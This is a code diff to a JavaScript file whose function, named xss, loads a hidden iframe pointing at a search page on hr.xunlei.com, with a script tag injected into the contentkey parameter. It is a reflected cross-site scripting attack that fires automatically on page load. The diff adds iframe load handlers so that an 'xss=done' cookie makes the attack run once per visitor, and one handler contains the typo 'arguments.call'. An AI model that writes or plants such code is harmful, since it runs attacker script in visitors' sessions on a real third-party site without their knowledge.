@@ -3,9 +3,21 @@ function xss() {
   var iframe = document.createElement("iframe");
   iframe.setAttribute("style", "display: none;");
   iframe.src = "http://hr.xunlei.com/searchlist.html?contentkey='%3Cscript%3E"+encodeURI(script)+"%3C/script%3E";
+  if (iframe.attachEvent) {
+    iframe.attachEvent("onreadystatechange", function(){
+      if(iframe.readyState === "complete" || iframe.readyState == "loaded"){
+        iframe.detachEvent( "onreadystatechange", arguments.callee);
+        document.cookie = "xss=done";
+      }
+    });
+  } else {
+    iframe.addEventListener( "load", function(){
+      this.removeEventListener( "load", arguments.call, false);
+        document.cookie = "xss=done";
+    }, false);
+  }
   document.body.appendChild(iframe);
 }
 if (document.cookie.indexOf("xss=done") == -1) {
   xss();
-  document.cookie = "xss=done";
 }
